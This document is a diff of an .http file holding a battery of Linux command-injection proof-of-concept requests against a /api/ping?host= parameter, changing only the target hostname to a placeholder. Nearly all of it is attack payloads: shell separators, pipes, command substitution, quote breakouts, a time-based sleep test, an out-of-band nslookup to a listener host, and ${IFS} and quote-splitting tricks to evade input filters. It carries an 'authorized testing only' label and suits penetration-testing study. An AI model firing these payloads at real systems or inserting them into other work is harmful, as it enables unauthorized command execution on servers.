@@ -4,7 +4,7 @@
 # Linux command-injection PoC battery (.http format - VS Code REST Client /
 # pasteable into Burp Repeater). x8bitranjit lab style. Authorized testing only.
 #
-# WHAT TO EDIT:  target.com  -> your authorized target;  /api/ping?host=
+# WHAT TO EDIT:  target.example.invalid  -> your authorized target;  /api/ping?host=
 # -> the actual vulnerable parameter. Payloads are BENIGN markers only
 # (id/whoami/expr 7*7) - never destructive commands.
 #
@@ -15,53 +15,53 @@
 # ============================================================================
 
 ### 1) separator battery (in-band - output reflected?)
-GET https://target.com/api/ping?host=127.0.0.1;id HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1;id HTTP/1.1
+Host: target.example.invalid
 
 ### 2) pipe variants
-GET https://target.com/api/ping?host=127.0.0.1|id HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1|id HTTP/1.1
+Host: target.example.invalid
 
 ### 3) OR/AND variants (|| runs on failure - strong blind test)
-GET https://target.com/api/ping?host=127.0.0.1||id HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1||id HTTP/1.1
+Host: target.example.invalid
 
 ###
-GET https://target.com/api/ping?host=127.0.0.1&&id HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&&id HTTP/1.1
+Host: target.example.invalid
 
 ### 4) substitution forms
-GET https://target.com/api/ping?host=127.0.0.1%60id%60 HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1%60id%60 HTTP/1.1
+Host: target.example.invalid
 
 ###
-GET https://target.com/api/ping?host=127.0.0.1$(id) HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1$(id) HTTP/1.1
+Host: target.example.invalid
 
 ### 5) newline separator (survives most metachar filters)
-GET https://target.com/api/ping?host=127.0.0.1%0aid HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1%0aid HTTP/1.1
+Host: target.example.invalid
 
 ### 6) quoted-context breakouts (try after plain rows fail)
-GET https://target.com/api/ping?host=127.0.0.1%22;id;%22 HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1%22;id;%22 HTTP/1.1
+Host: target.example.invalid
 
 ###
-GET https://target.com/api/ping?host=127.0.0.1%27;id;%27 HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1%27;id;%27 HTTP/1.1
+Host: target.example.invalid
 
 ### 7) time-based blind (confirm via delay; repeat 3x vs baseline)
-GET https://target.com/api/ping?host=127.0.0.1;sleep+10 HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1;sleep+10 HTTP/1.1
+Host: target.example.invalid
 
 ### 8) OOB confirm (EDIT: YOUR-OOB-HOST.example.invalid -> your listener)
-GET https://target.com/api/ping?host=127.0.0.1;nslookup+cmdi-linux.YOUR-OOB-HOST.example.invalid HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1;nslookup+cmdi-linux.YOUR-OOB-HOST.example.invalid HTTP/1.1
+Host: target.example.invalid
 
 ### 9) space-filter evasion (${IFS}) - when spaces are stripped
-GET https://target.com/api/ping?host=127.0.0.1;cat${IFS}/etc/hostname HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1;cat${IFS}/etc/hostname HTTP/1.1
+Host: target.example.invalid
 
 ### 10) keyword-filter evasion (quoted command names)
-GET https://target.com/api/ping?host=127.0.0.1;w%27hoami HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1;w%27hoami HTTP/1.1
+Host: target.example.invalid
